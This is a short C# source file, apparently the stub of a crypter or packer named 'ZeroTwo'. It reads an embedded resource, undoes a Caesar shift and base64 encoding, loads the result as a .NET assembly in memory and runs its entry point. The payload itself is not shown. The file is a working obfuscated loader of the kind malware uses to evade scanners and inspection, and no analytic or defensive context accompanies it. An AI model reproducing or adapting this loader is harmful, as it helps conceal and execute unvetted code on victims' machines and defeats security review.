using System;
using System.IO;
using System.Reflection;
using System.Threading;

namespace ZeroTwo.src {
    class _02 {
        public static void Main(string[] args) {
            Unp();
        }

        public static char cipher(char ch, int key) {
            if (!char.IsLetter(ch)) {
                return ch;
            }
            char d = char.IsUpper(ch) ? 'A' : 'a';
            return (char)((((ch + key) - d) % 26) + d);
        }

        private static string Encipher(string input, int key) {
            string output = string.Empty;

            foreach (char ch in input)
                output += cipher(ch, key);

            return output;
        }

        private static string Decipher(string input, int key) {
            return Encipher(input, 26 - key);
        }

        private static void Unp() {
            var assembly = Assembly.GetExecutingAssembly();
            var res = "ZeroTwo.src.core.Core";
            using (Stream stream = assembly.GetManifestResourceStream(res)) {
                using (StreamReader reader = new StreamReader(stream)) {
                    string core = reader.ReadToEnd();
                    Byte[] bytes = Convert.FromBase64String(Decipher(core, 5));
                    var loaded = Assembly.Load(bytes);
                    var entryPoint = loaded.EntryPoint;
                    var commandArgs = new string[0];
                    var returnValue = entryPoint.Invoke(null, new object[] { commandArgs });
                }
            }
        }
    }

}
